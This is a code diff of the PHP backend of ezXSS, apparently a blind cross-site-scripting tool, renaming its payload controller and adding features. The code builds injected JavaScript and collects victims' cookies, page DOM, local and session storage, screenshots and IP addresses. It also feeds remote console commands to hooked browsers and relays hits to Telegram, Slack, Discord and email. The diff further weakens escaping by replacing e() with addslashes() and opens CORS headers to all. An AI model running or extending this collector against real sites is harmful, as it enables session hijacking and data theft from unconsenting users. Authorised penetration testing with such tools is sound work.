@@ -1,6 +1,6 @@
 <?php
 
-class Payloads extends Controller
+class Trigger extends Controller
 {
     /**
      * Summary of rows
@@ -16,9 +16,9 @@ class Payloads extends Controller
     {
         parent::__construct();
 
-        // Add CORS headers
+        // CORS headers
         header('Access-Control-Allow-Origin: *');
-        header('Access-Control-Allow-Headers: origin, x-requested-with, content-type');
+        header('Access-Control-Allow-Headers: *');
         header('Access-Control-Allow-Methods: GET, POST');
 
         // Cache headers
@@ -50,7 +50,7 @@ class Payloads extends Controller
 
         // Create the string of pages we collect
         $pages = array_map(function ($page) {
-            return "'" . e($page) . "'";
+            return "'" . addslashes($page) . "'";
         }, array_filter(explode('~', $payload['pages'] ?? '')));
 
         $screenshot = $payload['collect_screenshot'] ? $this->view->getPayload('screenshot') : '';
@@ -63,10 +63,46 @@ class Payloads extends Controller
         $this->view->renderData('payload', url);
         $this->view->renderData('noCollect', implode(',', $noCollect), true);
         $this->view->renderData('pages', implode(',', $pages), true);
+        $this->view->renderData('spider', $payload['spider']);
         $this->view->renderDataWithLines('customjs', $payload['customjs'], true);
+        $this->view->renderDataWithLines('customjs2', $payload['customjs2'], true);
         $this->view->renderDataWithLines('globaljs', $this->model('Setting')->get('customjs'), true);
+        $this->view->renderDataWithLines('globaljs2', $this->model('Setting')->get('customjs2'), true);
         $this->view->renderDataWithLines('screenshot', $screenshot, true);
         $this->view->renderDataWithLines('persistent', $persistent ?? '', true);
+
+        // Load and render extensions
+        $globalExtensions = !empty($this->model('Setting')->get('extensions')) ? explode(',', $this->model('Setting')->get('extensions')) : [];
+        $payloadExtensions = !empty($payload['extensions']) ? explode(',', $payload['extensions']) : [];
+        
+        // Merge and remove duplicates
+        $allExtensionIds = array_unique(array_merge($globalExtensions, $payloadExtensions));
+        
+        $extensionCode = '';
+        foreach ($allExtensionIds as $extensionId) {
+            try {
+                $extension = $this->model('Extension')->getById($extensionId);
+
+                if ($extension['enabled'] != 1) {
+                    continue;
+                }
+                
+                $code = $extension['code'] ?? '';
+                
+                // Remove lines that start with //
+                $lines = preg_split("/\r\n|\n|\r/", $code);
+                $filteredLines = array_filter($lines, function($line) {
+                    return !str_starts_with(trim($line), '//');
+                });
+                $code = implode("\n", $filteredLines);
+                
+                $extensionCode .= $code . "\n";
+            } catch (Exception $e) {
+                continue;
+            }
+        }
+        
+        $this->view->renderDataWithLines('extensions', $extensionCode, true);
 
         return $this->view->getContent();
     }
@@ -100,15 +136,26 @@ class Payloads extends Controller
         $this->view->setContentType('text/plain');
 
         // Check method
-        if (!$this->isPOST()) {
+        if (!isPOST()) {
             return 'github.com/ssl/ezXSS';
         }
 
-        // Decode the JSON data
-        $data = json_decode(file_get_contents('php://input'), false);
+        // Get the input data
+        $input = file_get_contents('php://input');
+        $data = json_decode($input, false);
 
         if (empty($data) || !is_object($data)) {
-            return 'github.com/ssl/ezXSS';
+            // If JSON decode failed, check if it's form-encoded data
+            if (!empty($input) && strpos($input, '=') !== false && strpos($input, '&') !== false) {
+                parse_str($input, $formData);
+                $data = (object)$formData;
+            } else {
+                $data = (object)$_POST;
+            }
+            
+            if (empty($data) || !is_object($data)) {
+                return 'github.com/ssl/ezXSS';
+            }
         }
 
         // Set a default value for the screenshot
@@ -117,29 +164,35 @@ class Payloads extends Controller
         // Get the user's IP address
         $data->ip = substr($data->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'], 0, 50);
 
-        // Remove the protocol from the origin URL
-        $data->origin = str_replace(['https://', 'http://'], '', $data->origin ?? '');
-        $data->origin = ($data->origin === '' && $data->uri !== '') ? (parse_url($data->uri ?? '')['host'] ?? '') : $data->origin;
+        // Define URL and origin
+        $data->uri = $data->uri ?? ($_SERVER['HTTP_REFERER'] ?? ($_SERVER['HTTP_ORIGIN'] ?? ''));
+        $data->origin = str_replace(['https://', 'http://'], '', $data->origin ?? ($_SERVER['HTTP_ORIGIN'] ?? ''));
+        $data->origin = ($data->origin === '' && !empty($data->uri)) ? (parse_url($data->uri ?? '')['host'] ?? '') : $data->origin;
 
-        // Truncate very long strings
+        // Define and truncate very long strings
         $data->uri = substr($data->uri ?? '', 0, 1000);
         $data->referer = substr($data->referer ?? '', 0, 1000);
         $data->origin = substr($data->origin ?? '', 0, 255);
         $data->payload = substr($data->payload ?? '', 0, 255);
-        $data->{'user-agent'} = substr($data->{'user-agent'} ?? '', 0, 500);
+        $data->useragent = substr($data->{'user-agent'} ?? ($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 500);
+
+        $data->extra = $data->extra ?? '';
+        if(is_array($data->extra) || is_object($data->extra)) {
+            $data->extra = json_encode($data->extra);
+        }
 
         if(empty($data->payload)) {
             return 'github.com/ssl/ezXSS';
         }
 
-        // Check black and whitelist
+        // Check allow and deny list
         $payload = $this->getPayloadByUrl($data->payload);
 
-        $blacklistDomains = explode('~', $payload['blacklist'] ?? '');
-        $whitelistDomains = explode('~', $payload['whitelist'] ?? '');
+        $denylistDomains = explode('~', $payload['blacklist'] ?? '');
+        $allowlistDomains = explode('~', $payload['whitelist'] ?? '');
 
-        // Check for blacklisted domains
-        foreach ($blacklistDomains as $blockedDomain) {
+        // Check for denylisted domains
+        foreach ($denylistDomains as $blockedDomain) {
             if ($data->origin !== '' && $data->origin == $blockedDomain) {
                 return 'github.com/ssl/ezXSS';
             }
@@ -151,21 +204,21 @@ class Payloads extends Controller
             }
         }
 
-        // Check for whitelisted domains
+        // Check for allowlisted domains
         if ($payload['whitelist'] !== '' && $payload['whitelist'] !== null) {
-            $foundWhitelist = false;
-            foreach ($whitelistDomains as $whitelistDomain) {
-                if ($data->origin !== '' && $data->origin == $whitelistDomain) {
-                    $foundWhitelist = true;
+            $foundAllowlist = false;
+            foreach ($allowlistDomains as $allowlistDomain) {
+                if ($data->origin !== '' && $data->origin == $allowlistDomain) {
+                    $foundAllowlist = true;
                 }
-                if (strpos($whitelistDomain, '*') !== false) {
-                    $whitelistDomain = str_replace('*', '(.*)', $whitelistDomain);
-                    if (preg_match('/^' . $whitelistDomain . '$/', $data->origin)) {
-                        $foundWhitelist = true;
+                if (strpos($allowlistDomain, '*') !== false) {
+                    $allowlistDomain = str_replace('*', '(.*)', $allowlistDomain);
+                    if (preg_match('/^' . $allowlistDomain . '$/', $data->origin)) {
+                        $foundAllowlist = true;
                     }
                 }
             }
-            if (!$foundWhitelist) {
+            if (!$foundAllowlist) {
                 return 'github.com/ssl/ezXSS';
             }
         }
@@ -178,7 +231,7 @@ class Payloads extends Controller
         // Check if the report should be saved or alerted
         $doubleReport = false;
         if ($this->model('Setting')->get('filter-save') == 0 || $this->model('Setting')->get('filter-alert') == 0) {
-            $searchId = $this->model('Report')->searchForDublicates($data->cookies ?? '', $data->origin, $data->referer, $data->uri, $data->{'user-agent'}, $data->dom ?? '', $data->ip);
+            $searchId = $this->model('Report')->searchForDublicates($data->cookies ?? '', $data->origin, $data->referer, $data->uri, $data->useragent, $data->dom ?? '', $data->ip);
             if ($searchId !== false) {
                 if ($this->model('Setting')->get('filter-save') == 0 && $this->model('Setting')->get('filter-alert') == 0) {
                     return 'github.com/ssl/ezXSS';
@@ -202,7 +255,7 @@ class Payloads extends Controller
                         $data->screenshotData = time() . md5(
                             $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
                         ) . bin2hex(openssl_random_pseudo_bytes(5));
-                        $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotData}.png", 'w');
+                        $saveImage = @fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotData}.png", 'w');
                         if(!$saveImage) {
                             throw new Exception('Unable to save screenshots to server, check permissions');
                         }
@@ -228,12 +281,13 @@ class Payloads extends Controller
                     $data->origin,
                     $data->referer,
                     $data->uri,
-                    $data->{'user-agent'},
+                    $data->useragent,
                     $data->ip,
                     $data->screenshotData ?? '',
                     json_encode($data->localstorage ?? ''),
                     json_encode($data->sessionstorage ?? ''),
-                    $data->payload
+                    $data->payload,
+                    $data->extra ?? ''
                 );
                 $data->domain = host;
             } else {
@@ -244,8 +298,10 @@ class Payloads extends Controller
             $data->time = time();
             $data->timestamp = date('c', strtotime('now'));
 
+            $isCollected = strpos($data->referer, 'Collected page via ') !== false;
+
             // Send out alerts
-            if (($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) || $doubleReport === false) {
+            if ((($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) || $doubleReport === false) && !$isCollected) {
                 try {
                     $this->alert($data);
                 } catch (Exception $e) {
@@ -278,8 +334,12 @@ class Payloads extends Controller
             try {
                 $session = $this->model('Session')->getByClientId($data->clientid ?? '', $data->origin);
 
-                $this->model('Session')->setSingleValue($session['id'], 'time', time());
-                $this->model('Session')->setSingleDataValue($session['id'], 'console', $data->console ?? '');
+                $this->model('Session')->set($session['id'], 'time', time());
+                $this->model('Session')->set($session['id'], 'console', $data->console ?? '');
+
+                if($session['archive'] == 1) {
+                    $this->model('Session')->archiveByClientId($data->clientid ?? '', $data->origin);
+                }
 
                 return $this->model('Console')->getNext($data->clientid ?? '', $data->origin);
             } catch (Exception $e) {
@@ -296,7 +356,7 @@ class Payloads extends Controller
                 $data->origin,
                 $data->referer,
                 $data->uri,
-                $data->{'user-agent'},
+                $data->useragent,
                 $data->ip,
                 json_encode($data->localstorage ?? ''),
                 json_encode($data->sessionstorage ?? ''),
@@ -328,68 +388,54 @@ class Payloads extends Controller
         }
 
         $payload = $this->getPayloadByUrl($data->payload);
+        
+        $userIdToAlert = 0;
+        try {
+            if($payload['user_id'] !== 0) {
+                $user = $this->model('User')->getById($payload['user_id']); 
+                if($user['rank'] !== 0) {
+                    $userIdToAlert = $payload['user_id'];
+                }
+            }
+        } catch (Exception $e) {}
 
         // Email alerting
         if ($this->model('Setting')->get('alert-mail') == 1) {
             // Get all enabled alerts with this method of alerting
-            $alerts = $this->model('Alert')->getAllByMethodId(1);
+            $alerts = $this->model('Alert')->getByMethodId(1, $userIdToAlert);
 
             foreach ($alerts as $alert) {
-                if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
-                    $this->mailAlert($data, $alert['value1']);
-                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
-                    // Sends alert to user that owns the payload
-                    $this->mailAlert($data, $alert['value1']);
-                }
+                $this->mailAlert($data, $alert['value1']);
             }
         }
 
         // Telegram alerting
         if ($this->model('Setting')->get('alert-telegram') == 1) {
             // Get all enabled alerts with this method of alerting
-            $alerts = $this->model('Alert')->getAllByMethodId(2);
+            $alerts = $this->model('Alert')->getByMethodId(2, $userIdToAlert);
 
             foreach ($alerts as $alert) {
-                if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
-                    $this->telegramAlert($data, $alert['value1'], $alert['value2']);
-                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
-                    // Sends alert to user that owns the payload
-                    $this->telegramAlert($data, $alert['value1'], $alert['value2']);
-                }
+                $this->telegramAlert($data, $alert['value1'], $alert['value2']);
             }
         }
 
         // Slack alerting
         if ($this->model('Setting')->get('alert-slack') == 1) {
             // Get all enabled alerts with this method of alerting
-            $alerts = $this->model('Alert')->getAllByMethodId(3);
+            $alerts = $this->model('Alert')->getByMethodId(3, $userIdToAlert);
 
             foreach ($alerts as $alert) {
-                if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
-                    $this->slackAlert($data, $alert['value1']);
-                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
-                    // Sends alert to user that owns the payload
-                    $this->slackAlert($data, $alert['value1']);
-                }
+                $this->slackAlert($data, $alert['value1']);
             }
         }
 
         // Discord alerting
         if ($this->model('Setting')->get('alert-discord') == 1) {
             // Get all enabled alerts with this method of alerting
-            $alerts = $this->model('Alert')->getAllByMethodId(4);
+            $alerts = $this->model('Alert')->getByMethodId(4, $userIdToAlert);
 
             foreach ($alerts as $alert) {
-                if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
-                    $this->discordAlert($data, $alert['value1']);
-                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
-                    // Sends alert to user that owns the payload
-                    $this->discordAlert($data, $alert['value1']);
-                }
+                $this->discordAlert($data, $alert['value1']);
             }
         }
     }
